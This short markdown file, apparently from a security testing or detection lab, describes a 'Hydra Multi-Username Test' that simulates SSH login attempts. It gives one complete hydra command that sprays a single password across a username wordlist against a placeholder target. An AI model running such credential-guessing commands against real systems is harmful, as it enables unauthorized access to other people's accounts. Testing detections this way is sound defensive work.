# Hydra Multi-Username Test

## Objective
Simulate SSH login attempts across multiple usernames from a single attacker source.

## Command
```bash
hydra -L wordlists/ssh-users.txt -p password -t 2 -V ssh://<TARGET-IP>
```
